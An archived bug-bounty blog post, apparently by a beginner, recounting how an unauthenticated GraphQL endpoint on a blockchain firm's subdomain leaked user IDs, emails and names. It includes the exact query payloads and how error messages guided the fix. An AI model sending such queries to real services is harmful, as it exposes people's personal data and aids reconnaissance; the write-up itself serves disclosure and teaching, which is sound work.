# ️ How I Found an Unauthenticated GraphQL Data Exposure and got 0$ for it

- **Source URL:** https://medium.com/@77r4sed/%EF%B8%8F-how-i-found-an-unauthenticated-graphql-data-exposure-and-got-0-for-it-edfb07bf72a8?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250822121419/https://medium.com/@77r4sed/%EF%B8%8F-how-i-found-an-unauthenticated-graphql-data-exposure-and-got-0-for-it-edfb07bf72a8
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10327 (id 10327)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 🕳️ How I Found an Unauthenticated GraphQL Data Exposure and got 0$ for it

Recently, I stumbled upon a classic yet dangerous misconfiguration:

an exposed GraphQL endpoint that handed over sensitive user data no authentication needed.

Here’s how I found it. I hope you enjoy the read. 😉

# 🚨 The Initial Recon

While poking around a subdomain associated with a well-known blockchain company, I noticed something interesting in the traffic:

`/api/graphql`
Most bug hunters know GraphQL endpoints can be a goldmine if it’s not properly secured especially if introspection is enabled or access controls are missing.

So… I started testing.

# 🔍 First Shot

I sent a basic POST request with this payload:

`{ "query": "{ users { id email username role } }" }`
It came back with a `400 Bad Request`, but what caught my eye was the error message:

```
{
  "errors": [
    {
      "message": "Cannot query field \"username\" on type \"User\". Did you mean \"name\"?"
    },
    {
      "message": "Cannot query field \"role\" on type \"User\"."
    }
  ]
}
```
That was my clue.

# 🧠 Adjusting the Query

Based on what the error told me, I fixed the query to:

```
{ "query": "{ users { id email name } }" }
```
I hit send again…

## **Boom. 200 OK.**

The response returned internal users’ IDs, emails, and full names — no login, no token, nothing.

```
{
  "data": {
    "users": [
      { "id": "REDACTED_ID_1", "email": "user1@example.com", "name": "User One" },
      { "id": "REDACTED_ID_2", "email": "user2@example.com", "name": "User Two" },
      { "id": "REDACTED_ID_3", "email": "user3@example.com", "name": "User Three" },
      { "id": "REDACTED_ID_4", "email": "user4@example.com", "name": "User Four" },
      { "id": "REDACTED_ID_5", "email": "user5@example.com", "name": "User Five" },
      { "id": "REDACTED_ID_6", "email": "user6@example.com", "name": "User Six" },
      { "id": "REDACTED_ID_7", "email": "user7@example.com", "name": "User Seven" },
      { "id": "REDACTED_ID_8", "email": "user8@example.com", "name": "User Eight" },
      { "id": "REDACTED_ID_9", "email": "user9@example.com", "name": "User Nine" },
      { "id": "REDACTED_ID_10", "email": "user10@example.com", "name": "User Ten" }
    ]
  }
}
```
Despite the clear impact (sensitive internal user data exposure), the platform marked it *out of scope*.

$0 bounty.

But honestly, I still consider it a win. because this was actually my first valid medium severity bug i’m still a beginner in this field.

This bug wasn’t flashy. No RCE, no shell. but its the type of bug that attackers do exploit for internal recon and social engineering. and thats it for today’s blog i hope you enjoyed reading it and maybe even learned something new.. I’ll keep posting and sharing as I level up. More bugs, more tips, more lessons.

**Goodbye :)**

goodbye :).
